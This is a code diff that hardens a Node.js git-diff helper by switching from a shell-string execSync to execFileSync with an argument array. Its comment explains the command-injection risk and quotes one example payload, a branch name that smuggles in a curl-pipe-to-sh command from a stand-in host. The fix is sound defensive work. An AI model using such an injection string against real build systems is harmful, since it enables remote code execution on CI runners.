@@ -25,7 +25,7 @@
 // and skipping the LLM round-trip keeps the check fast and free.
 
 import { readFileSync, writeFileSync, existsSync } from "node:fs";
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import { resolve, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 
@@ -73,7 +73,24 @@ function parseArgs(argv) {
 
 function changedFiles(base) {
   try {
-    const out = execSync(`git diff --name-only ${base}...HEAD`, { cwd: ROOT, encoding: "utf8" });
+    // execFileSync with an argument array, not execSync with a shell string.
+    // `base` comes from `--base <ref>` and reaches this line unvalidated, and
+    // a git branch name may legally contain `;`, `$`, `&`, `|` and backticks —
+    // git forbids space, `~`, `^`, `:`, `?`, `*` and `[`, but not those. So
+    // `--base 'main;curl evil.sh|sh'` was a command, not a ref.
+    //
+    // Nothing feeds this untrusted input today: no workflow passes --base, so
+    // it defaults to the hardcoded "origin/main" and the only way to exploit
+    // it was to type the exploit yourself. But the usage line advertises
+    // `--base <ref>`, and wiring that to `${{ github.base_ref }}` in a
+    // workflow is the obvious next step — at which point a branch name
+    // executes code on the runner. With no shell there is no metacharacter to
+    // inject, so the hazard is gone rather than merely unreachable.
+    //
+    // Found by this repository's own scanner, on the first pull request after
+    // the calibration deployed.
+    const out = execFileSync("git", ["diff", "--name-only", `${base}...HEAD`],
+      { cwd: ROOT, encoding: "utf8" });
     return { ok: true, files: new Set(out.split("\n").map((s) => s.trim()).filter(Boolean)) };
   } catch (err) {
     return { ok: false, reason: String(err && err.message || err).split("\n")[0] };
